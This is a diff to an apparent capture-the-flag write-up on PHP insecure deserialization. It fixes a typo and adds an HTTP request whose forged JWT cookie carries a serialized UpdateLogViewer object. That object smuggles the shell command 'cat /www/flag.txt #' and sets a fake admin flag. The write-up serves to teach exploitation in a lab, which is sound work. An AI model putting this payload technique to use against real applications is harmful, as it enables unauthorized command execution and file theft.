@@ -369,7 +369,7 @@ We see that the `UpdateLogViewer` class implements the [PHP magic method](https:
 
 We can create our own instance of `UpdateLogViewer` that will dump the `/www/flag.txt` file when `UpdateLogViewer::read()` is invoked. We can serialize this PHP object and embed it in the JWT token. When the server receives it, it will invoke the `__wakeup()` method and use our malicious object instead of the original one that it has.
 
-We use the following snipper of PHP code to generate the appropriate PHP serialized object that will be placed inside the `settings` part of the JWT token.
+We use the following snippet of PHP code to generate the appropriate PHP serialized object that will be placed inside the `settings` part of the JWT token.
 
 ```php
 $x = UpdateLogViewer::instance();
@@ -395,6 +395,8 @@ So, we create a [malicious JWT](https://jwt.io/#debugger-io?token=eyJhbGciOiJIUz
 
 ```html
 GET /log HTTP/1.1
+Host: 127.0.0.1
+Cookie: jwt=eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ2YXJpYW50cyI6WyJBbHBoYSIsIkJldGEiLCJHYW1tYSIsIkRlbHRhIiwiT21pY3JvbiIsIkxhbWJkYSIsIkVwc2lsb24iLCJaZXRhIiwiRXRhIiwiVGhldGEiLCJJb3RhIiwiNTRiMTYzNzgzYzQ2ODgxZjFmZTdlZTA1ZjkwMzM0YWEiXSwic2V0dGluZ3MiOiJhOjI6e2k6MDtPOjQ6XCJVc2VyXCI6Mzp7czo0OlwibmFtZVwiO3M6NTpcImFkbWluXCI7czo3OlwiaXNBZG1pblwiO2I6MTtzOjI6XCJpZFwiO3M6NDA6XCJjZmQ2ZDQwMTA2MWVhNDU2OTFhZjAwY2UwNGQ2MDk3MWE4ZmFmNTdiXCI7fWk6MTtPOjE1OlwiVXBkYXRlTG9nVmlld2VyXCI6Mjp7czoxMDpcInBhY2tnZU5hbWVcIjtzOjA6XCJcIjtzOjEyOlwibG9nQ21kUmVhZGVyXCI7czoxOTpcImNhdCAvd3d3L2ZsYWcudHh0ICNcIjt9fSIsImV4cCI6MjY0MzYzMzQ4M30.2Hediv2wh6h8rvHPni9Dpram-wjVfl_hNOsd6YxBXGQ
 
 HTTP/1.1 200 OK
 
